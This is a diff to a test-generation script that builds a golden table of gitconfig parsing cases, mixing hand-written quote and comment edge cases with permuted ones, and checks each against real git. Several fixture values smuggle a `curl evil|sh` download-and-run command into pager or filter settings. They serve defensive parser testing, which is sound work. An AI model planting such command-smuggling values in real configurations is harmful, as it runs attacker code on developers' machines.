@@ -35,7 +35,49 @@ const CASES = {
   'bom': '﻿[core]\n\tfsmonitor = /tmp/x.sh\n',
   'leading-blank-lines': '\n\n[core]\n\tfsmonitor = /tmp/x.sh\n',
   'empty-value': '[core]\n\tfsmonitor =\n',
+  // Quote-state sweep (review 02, N-2). A quote opened halfway through a value
+  // changes where the value ends; sixteen shapes, in both directions.
+  'quote-mid-comment': '[filter "x"]\n\tclean = cat" ; curl evil|sh"\n',
+  'quote-mid-hash': '[filter "x"]\n\tclean = cat" # curl evil|sh"\n',
+  'quote-around-semicolon': '[core]\n\tpager = /tmp/a" ; "b\n',
+  'quote-split-value': '[core]\n\tpager = p" ; "q\n',
+  'quote-hash-split': '[core]\n\teditor = a" # "b\n',
+  'quote-trailing-semicolon': '[core]\n\teditor = vim" ;"\n',
+  'quoted-then-comment': '[core]\n\tpager = "less" ; curl x|sh\n',
+  'bare-then-semicolon': '[core]\n\tpager = less;curl x|sh\n',
+  'bare-then-hash': '[core]\n\tpager = less#curl x|sh\n',
+  'empty-quotes': '[core]\n\tpager = ""\n',
+  'quotes-around-whole': '[core]\n\tfsmonitor = "/tmp/x.sh"\n',
+  'quote-then-space': '[core]\n\tfsmonitor = "/tmp/x.sh" \n',
+  'double-quoted-runs': '[core]\n\tfsmonitor = "/tmp/""x.sh"\n',
+  'escaped-quote-in-bare': '[core]\n\tpager = a\\"b\n',
+  'backslash-before-semicolon': '[core]\n\tpager = a\\;b\n',
+  'unbalanced-quote': '[core]\n\tfsmonitor = /tmp/x.sh"\n',
 };
+
+// Hand-picked cases catch the variant someone thought of. This block catches the
+// one nobody did: it permutes where a quote, a comment character, an escape and a
+// separator sit inside one value and asks git about every combination. Review 02
+// (N-2) found the whole class this way — the parser scored `cat" ; curl evil|sh"`
+// as the bare command `cat"` while git ran the entire line — and a table without
+// a mid-value quote in it could not have failed on that.
+const PIECES = ['', 'a', '"', '#', ';', ' ', '\\\\"', '|'];
+function permutedCases() {
+  const cases = {};
+  for (let i = 0; i < PIECES.length; i++) {
+    for (let j = 0; j < PIECES.length; j++) {
+      for (let k = 0; k < PIECES.length; k++) {
+        // Leading, interior and trailing position, so a quote at the start (the
+        // only shape the hand-written table had) is one case among many rather
+        // than the assumption the whole table rests on.
+        cases[`perm-${i}${j}${k}`] = `[core]\n\tpager = ${PIECES[i]}cmd${PIECES[j]}x${PIECES[k]}\n`;
+      }
+    }
+  }
+  return cases;
+}
+
+const ALL = { ...CASES, ...permutedCases() };
 
 const dir = await mkdtemp(path.join(tmpdir(), 'gs-golden-'));
 const version = execFileSync('git', ['--version'], { encoding: 'utf-8' }).trim();
@@ -46,7 +88,7 @@ const out = { _note: [
   'for those, "we fail towards the safe side" is a claim our own tests carry, not git.',
 ], _git: version, _generated: new Date().toISOString().slice(0, 10), cases: {} };
 
-for (const [name, text] of Object.entries(CASES)) {
+for (const [name, text] of Object.entries(ALL)) {
   const file = path.join(dir, `${name}.gitconfig`);
   await writeFile(file, text, 'utf-8');
   let listed = null, error = null;
@@ -63,4 +105,4 @@ for (const [name, text] of Object.entries(CASES)) {
 }
 await rm(dir, { recursive: true, force: true });
 await writeFile('test/fixtures/gitconfig-golden.json', JSON.stringify(out, null, 2) + '\n', 'utf-8');
-console.log(`golden table: ${Object.keys(CASES).length} cases, ${version}`);
+console.log(`golden table: ${Object.keys(ALL).length} cases (${Object.keys(CASES).length} hand-written, ${Object.keys(ALL).length - Object.keys(CASES).length} permuted), ${version}`);
